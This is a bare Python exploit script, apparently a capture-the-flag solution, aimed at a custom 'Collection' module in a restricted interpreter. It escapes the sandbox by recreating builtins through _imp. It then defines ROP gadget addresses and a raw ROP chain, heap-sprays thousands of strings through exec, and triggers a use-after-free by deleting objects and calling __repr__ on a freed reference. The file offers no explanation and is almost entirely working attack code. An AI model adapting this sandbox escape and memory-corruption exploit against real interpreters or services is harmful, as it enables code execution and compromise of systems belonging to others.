
print('hello1')

sys=modules['sys']
_imp=modules['_imp']
os=sys.__class__('os')
os.name='builtins'
__builtins__=_imp.create_builtin(os)
os=modules['site'].os

gadget = 0x474c89
gadget=0x499ab5
help_ip=0x4a6595
nop=0x400291
good=0x639381
#input("here")
C=Collection.Collection
rop = '\xc1&@\x00\x00\x00\x00\x00\x10(\xa8\x00\x00\x00\x00\x00{\x0fB\x00\x00\x00\x00\x00\x00(\xa8\x00\x00\x00\x00\x00\x07\x0cR\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00{\x0fB\x00\x00\x00\x00\x00\x08(\xa8\x00\x00\x00\x00\x00\x07\x0cR\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x12\x16B\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x0e\x11B\x00\x00\x00\x00\x00\x00(\xa8\x00\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xb0\x08B\x00\x00\x00\x00\x00\x12\x16B\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0e\x11B\x00\x00\x00\x00\x00\x10(\xa8\x00\x00\x00\x00\x00\xc1&@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\xe0\x07B\x00\x00\x00\x00\x00\xbc\x9axV4\x12\x00\x00'

base_rop = '\x91\x02\x40\0\0\0\0\0'*7000+rop
print('hello2')
#spray
for i in range(10000):
    exec("t%d=chr(%d)*8+base_rop"%(i,i%222))
print('hello3')
#addr='\xb5\x9a\x49\0\0\0\0\0'
addr='\xec\x69\x4a\0\0\0\0\0'
sprays=addr*40

for i in range(50):
    exec("a%s=C({'d':[addr*40], 'e':[addr*40], 'c':[addr*40], 'b':[addr*40],'f':[addr*40]})"%str(i))

a=C({'d':[addr*40], 'e':[addr*40], 'c':[addr*40], 'b':[addr*40],'f':[addr*40]})
b=C({"a":[a]})

for i in range(50):
    exec("b%s=C({'d':[addr*40], 'e':[addr*40], 'c':[addr*40], 'b':[addr*40],'f':[addr*40]})"%str(i))

for i in range(10000):
    exec("t%d=sprays+chr(%d)*8"%(i,i%222))

del a
for i in range(10000):
    exec("t%d=sprays+chr(%d)*8"%(i,i%222))
o=b.get('a')[0].get('d')
del o
print(dir(b.get('a')))
b.get('a').__repr__()
